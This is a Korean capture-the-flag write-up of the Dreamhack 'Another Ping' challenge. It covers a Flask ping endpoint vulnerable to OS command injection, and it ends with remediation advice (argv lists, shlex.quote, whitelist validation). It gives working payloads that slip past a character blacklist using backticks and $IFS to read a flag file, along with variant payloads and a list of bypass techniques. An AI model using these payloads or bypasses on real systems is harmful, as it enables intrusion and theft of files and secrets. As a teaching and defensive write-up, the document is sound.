---
layout: post
title:  "Dreamhack 워게임 Another Ping 풀이 — 공백 차단 우회 ($IFS) + 백틱 명령 치환으로 flag 읽기"
date:   2026-05-16 14:30:00 +0900
categories: security web wargame dreamhack writeup command-injection shell
---

## 들어가며

Dreamhack 웹해킹 워게임 **Another Ping** (난이도 Bronze 2) 풀이입니다. "또 하나의 ping 유틸" 이라는 평범한 외피 안에, 사이버보안 입문 학생이 한 번에 익혀야 할 **shell 메타문자 블랙리스트 우회의 정석 2가지** 가 들어 있습니다 — **`$IFS` 로 공백 우회 + 백틱(`)으로 명령 치환**.

문제 설명:

> What? Another, yet boring ping utility?

스포일러로 결론 — `curl` 한 줄.

```bash
curl -X POST "$SERVER/ping" \
  --data-urlencode 'ip=127.0.0.1`cat$IFS/app/flag.txt`'
# → stderr 에 "ping: 127.0.0.1DH{...}: Name or service not known"
```

핵심 트릭:

1. **공백 차단** → `$IFS` (Internal Field Separator 환경변수) 로 대체. `{` `}` 도 차단이라 `${IFS}` 못 쓰지만 `$IFS` 그대로는 통과.
2. **`;` `|` `&` `(` `)` 차단** → `` ` `` (백틱) 으로 명령 치환. 백틱은 필터에 없음.
3. `ping` 의 호스트 인자 자리에 명령 출력이 그대로 박혀 invalid hostname 으로 **stderr 에 노출** — DNS 에러 메시지가 정보 채널.

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

```python
FILTERED_CHARS = [' ', ';', '|', '&', '>', '<', '(', ')', '[', ']', '{', '}', '\n', '\r']

def is_valid_ip(ip):
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return bool(re.match(ip_pattern, ip))

def filter_input(user_input):
    for char in FILTERED_CHARS:
        if char in user_input:
            return False, f"Invalid character detected: {char}"
    return True, "OK"

@app.route('/ping', methods=['POST'])
def ping():
    ip = request.form.get('ip', '').strip()
    if not ip: return jsonify({'error': '...'}), 400
    is_valid, message = filter_input(ip)
    if not is_valid: return jsonify({'error': message}), 400

    cmd = f"ping -c 4 {ip}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
    return jsonify({
        'command': cmd,
        'stdout': result.stdout,
        'stderr': result.stderr,
        'returncode': result.returncode
    })
```

핵심 4가지:

1. **`shell=True`** — Python subprocess 가 shell (`/bin/sh`) 를 거쳐 실행. 사용자 입력이 shell metachar 로 해석됨. **OS Command Injection 1티어 신호**.
2. **`is_valid_ip` 는 정의만 되어 있고 호출 안 됨** — IP 형식 검증이 안 이루어진다. (Bronze 2 의 "구현 덜 됨" 힌트)
3. **블랙리스트 14개 문자** : ` ; | & > < ( ) [ ] { } \n \r`. 차단되지 않는 메타: `` ` `` `$` `\\` `*` `?` `'` `"` `~` `!` `#` `^` `=`.
4. **stdout 과 stderr 모두 반환** — 명령 출력이 어디로 가든 우리에게 보임.

### 1-1. 결정적 단서

블랙리스트에서 **`` ` `` (backtick) 가 빠진 게 결정적**. 백틱은 명령 치환 (`` `cmd` ``) 의 또 다른 문법. `$(cmd)` 는 `(` `)` 가 막혀서 못 쓰지만 백틱은 두 글자로 같은 일을 한다.

그리고 **공백 차단 우회** : 셸은 단어 분리를 IFS (기본값: 공백+탭+개행) 변수로 한다. `$IFS` 그 자체가 공백처럼 작용. 더 자주 쓰이는 `${IFS}` 형태가 `{` `}` 차단으로 막혔지만, `$IFS` 한 글자형 변수 참조는 그대로 통과.

## 2. 페이로드 빌드

목표 명령 : `cat /app/flag.txt` (Dockerfile 의 WORKDIR=/app, deploy/flag.txt 복사됨).

shell 에서 만들고 싶은 모양 :

```bash
ping -c 4 127.0.0.1`cat /app/flag.txt`
```

위의 공백을 `$IFS` 로 치환:

```bash
ping -c 4 127.0.0.1`cat$IFS/app/flag.txt`
```

우리가 보낼 `ip` 값:

```
127.0.0.1`cat$IFS/app/flag.txt`
```

필터 통과 점검 (사용된 문자):

| 문자 | 차단? |
|------|-------|
| `1` `2` `7` `0` `.` | × |
| `` ` `` | × (안 막힘) |
| `c` `a` `t` | × |
| `$` `I` `F` `S` | × |
| `/` | × |
| `f` `l` `a` `g` `t` `x` `t` | × |

모두 통과. ✓

### 2-1. 실행 결과

```bash
$ curl -s -X POST "$SERVER/ping" \
       --data-urlencode 'ip=127.0.0.1`cat$IFS/app/flag.txt`' \
       | python3 -m json.tool
{
    "command": "ping -c 4 127.0.0.1`cat$IFS/app/flag.txt`",
    "returncode": 2,
    "stderr": "ping: 127.0.0.1DH{c64c86a3e2121098:3mqL/LCTNYo0kExsJIteyg==}: Name or service not known\n",
    "stdout": ""
}
```

shell 이 백틱 안 명령 (`cat /app/flag.txt`) 을 먼저 평가 → 출력 `DH{...}` 가 ping 의 호스트 인자에 박혀 → `ping 127.0.0.1DH{...}` → DNS 해석 실패 → **stderr 에 호스트 이름이 그대로** 노출.

flag: `DH{c64c86a3e2121098:3mqL/LCTNYo0kExsJIteyg==}` ✓

## 3. 다른 유효한 payload 들

같은 필터 우회로 만들 수 있는 변형들. 한 줄 PoC 가 안 통할 때 fallback 으로:

```
# 1) backtick + tab 대신 $IFS$9
ip=127.0.0.1`cat$IFS$9/app/flag.txt`

# 2) backtick 안에서 \" 또는 brace expansion 으로 (안 통함 — { } 차단)

# 3) 백틱 대신 백슬래시 + newline (newline 차단 → 불가)

# 4) tab 문자 (0x09) — 필터 검사가 ' ' 만 → tab 통과! (단, URL 인코딩으로 보내야 함)
ip=127.0.0.1`cat%09/app/flag.txt`   # %09 은 tab. 그러나 IFS 의 일부라 공백처럼 동작
```

가장 깨끗한 첫 번째 (`$IFS`) 가 추천.

## 4. 취약점 해설 — Command Injection 1교시

### 4-1. 본 문제의 본질

이 클래스의 본질을 한 줄로:

> **`shell=True` (또는 `system()`, `exec()` 류) 에 사용자 입력이 들어가는 모든 곳은 즉시 RCE 후보**. 블랙리스트로 막아도 shell 의 메타문자 수가 너무 많아 거의 항상 우회 가능.

shell 의 메타문자 카테고리 (대략):

- **명령 구분자**: `;`, `&`, `|`, `&&`, `||`, newline
- **명령 치환**: `$(cmd)`, `` `cmd` ``
- **변수 치환**: `$VAR`, `${VAR}`, `${VAR/x/y}`, `${!VAR}`
- **glob/wildcard**: `*`, `?`, `[abc]`
- **redirection**: `>`, `<`, `>>`, `<<`
- **quoting**: `'...'`, `"..."`, `\\`
- **process substitution**: `<(cmd)`, `>(cmd)`

이 중 한 카테고리라도 빠뜨리면 즉시 우회 가능. 본 문제는 명령 구분자/redirection/process substitution/괄호류는 막았지만, **명령 치환의 백틱 형태와 변수 치환 모두** 빠뜨렸다.

### 4-2. 같은 클래스의 실무 사례

- **거의 모든 "ping/traceroute/dig/whois" UI** 가 이 패턴. shell 명령 wrapping 의 일반적인 패턴이고, 블랙리스트로 만들어진 모든 변형이 우회됨.
- **CI/CD 서버의 build trigger** 가 사용자 입력을 shell 에 넘기는 경우 — Jenkins, GitLab CI 등.
- **PHP `system()`/`exec()`/`passthru()`** 에 사용자 입력 — WordPress 플러그인 RCE 의 단골.
- **이미지/PDF 변환 도구** 가 imagemagick/ghostscript 의 shell command 를 빌드 — CVE-2016-3714 (ImageTragick) 등.

### 4-3. 위험성

- 본 PoC 는 파일 읽기지만, 같은 inj 으로 임의 명령 실행 → 백도어 다운로드 → 영구 access.
- 컨테이너 안이라도 sensitive secret (.env, ssh keys, cloud IMDS) 노출.
- 같은 컨테이너의 다른 서비스 / sidecar 까지 영향.

### 4-4. 올바른 방어

1. **`shell=True` 절대 금지**. 항상 argv 리스트로 호출:

   ```python
   subprocess.run(["ping", "-c", "4", ip], capture_output=True, text=True, timeout=10)
   ```

   이 경우 ip 가 어떤 메타문자를 갖든 그저 한 개 인자로 전달. shell 평가 자체가 일어나지 않음.

2. **shell 이 꼭 필요하면 `shlex.quote`**:

   ```python
   import shlex
   cmd = f"ping -c 4 {shlex.quote(ip)}"
   subprocess.run(cmd, shell=True, ...)
   ```

3. **입력 검증을 화이트리스트로** : 본 문제는 `is_valid_ip` 가 이미 정의되어 있는데 호출 안 함. IP regex 로 통과한 입력만 ping 에 넘기면 끝.

   ```python
   if not is_valid_ip(ip): return error
   ```

4. **PSL (Principle of Least surprise) — shell 호출 자체를 피하라**. Python 표준 라이브러리에 `socket.gethostbyname`, `subprocess` argv 형태 등 대체 가능한 도구가 거의 항상 있다.

5. **SECCOMP / seccomp-bpf** 로 컨테이너 안에서 `execve` 자체를 화이트리스트로 제한 (high-security 환경에서).

## 5. 정리 — 입문자가 가져갈 교훈

- **`shell=True`** 와 사용자 입력이 만나는 모든 코드 = 1순위 RCE 후보. grep `shell=True\|system(\|exec(\|passthru(\|eval(` 한 줄로 코드 베이스 audit.
- 블랙리스트 필터는 거의 항상 우회된다. shell 메타문자 카테고리 6-7가지 중 한 가지만 안 막아도 끝.
- 우회 도구함 (memorize):
  - 공백 : `$IFS`, `$IFS$9`, tab, `${IFS}`
  - 명령 치환 : `` `cmd` ``, `$(cmd)`
  - 명령 구분 : `;`, `&`, `|`, `\n`, `||`, `&&`
- 정답 방어는 **shell 자체를 피하기**. argv 리스트 + 화이트리스트 입력 검증.

같은 카테고리의 다음 단계로 **Command Injection Advanced**, **Blind RCE (out-of-band exfil)**, **PHP system bypass** 같은 문제를 풀어 보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 처음에 `/flag.txt` 로 시도 (잘못된 path)

기본 본능으로 `cat /flag.txt` 시도. 결과: `cat: /flag.txt: No such file or directory`. Dockerfile 확인 후 WORKDIR=/app 이라 `/app/flag.txt` 인 것을 확인.

**회고**: command injection 성공 후에는 항상 **첫 명령으로 `ls` 또는 `pwd`** 로 환경 정찰. 페이로드 변형 만들기 전에 5초 정찰이 시간 절약.

### 실패 2. `${IFS}` 부터 시도

shell 에서 가장 표준적인 공백 우회는 `${IFS}` 다. 처음에 그걸 시도하다가 `{` `}` 가 차단 list 에 있어 막힘. `$IFS` (중괄호 없이) 로 변경하니 통과.

**회고**: `$IFS` 와 `${IFS}` 의 차이를 기억하자. `$VAR` 는 변수 이름이 영숫자/언더스코어 시퀀스로 끝나는 형태. 뒤에 다른 문자가 붙으면 `$VAR_other` 처럼 합쳐 해석. 우리 경우 `$IFS/app` 은 `$IFS` 변수 + 그 다음 `/app` 로 정확히 분리. (변수명에 `/` 가 들어갈 수 없으므로.) 안전하게 분리 보장.

### 실패 3. 결과를 stdout 에서 찾으려다 stderr 에 있는 걸 보고 깨달음

처음에 `result.stdout` 만 grep 해서 flag 가 없었다. JSON 응답 전체를 json.tool 로 예쁘게 출력하니 `stderr` 에 `ping: 127.0.0.1DH{...}: Name or service not known` 형태로 박혀 있는 것 확인.

**회고**: 명령 치환 + 호스트 인자 결합 패턴은 보통 stdout 이 아니라 **호스트 이름이 그대로 stderr 에 노출** 된다 (DNS 해석 실패 메시지). stdout, stderr 둘 다 항상 확인.

### 실패 4. 백틱과 `$()` 의 차이를 다시 한 번 짚었어야 했음

본능적으로 `$(cmd)` 부터 시도. `(` `)` 차단으로 막힘. 백틱 `` `cmd` `` 도 같은 기능인데 더 짧다 — 이게 정답.

**회고**: shell 명령 치환 형태 3가지 (`$(cmd)`, `` `cmd` ``, `<<<` here-string + read) 를 모두 memorize. 차단 list 에 따라 골라 쓰자.
